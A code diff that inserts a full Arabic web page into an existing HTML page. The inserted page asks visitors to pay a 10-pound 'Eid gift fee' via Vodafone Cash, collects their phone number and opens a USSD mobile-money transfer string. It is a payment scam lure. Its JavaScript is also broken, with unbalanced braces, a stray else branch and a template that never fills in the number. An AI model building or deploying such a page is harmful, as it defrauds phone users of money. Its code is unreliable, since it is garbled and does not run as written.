@@ -54,7 +54,60 @@
     class="icon"
     onclick="location.href='https://ipn.eg/S/mahdihassan/instapay/51rzLz'"
     />
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسديد 10 جنية رسوم العيديةفودافون كاش</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .form-container { max-width: 400px; margin: auto; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; }
+        .error { color: red; display: none; }
+        .subscribe-btn { background-color: red; color: white; padding: 10px 20px; border: none; margin-top: 20px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>تسديد رسوم العيدية فودافون كاش</h2>
+        <form id="loginForm" onsubmit="return validateLogin()">
+            <input type="number" id="studentCode" placeholder="رقمك" required>
+            <p id="errorMessage" class="error"> التاكد من الرقم
+        </form>
+        <button class="subscribe-btn" onclick="sendWhatsApp()">اشترك الآن</button>
+    </div>
 
+    <script>
+        function validateLogin() {
+            const code = parseInt(document.getElementById("studentCode").value);
+            const errorMessage = document.getElementById("errorMessage");
+
+            if (code < 01000000000 || code > 019999999999) {
+                errorMessage.style.display = "block";
+                return false;
+            }
+
+            
+                alert("جاري تحويلك للدفع !");
+                errorMessage.style.display = "none";
+                return false;
+            } else {
+                errorMessage.style.display = "block";
+                return false;
+            }
+        }
+
+        function sendWhatsApp() {
+            const phoneNumber = "code";
+           
+            const url = `*9*7*{code} *10#`;
+            window.open(url, "_blank");
+        }
+    </script>
+</body>
+</html>
     <div class="decorative-border"></div>
   
     <p class="credits">
@@ -265,6 +318,7 @@
   <script src="main.js"></script>
 </body>
 </html>
+
 
 
 
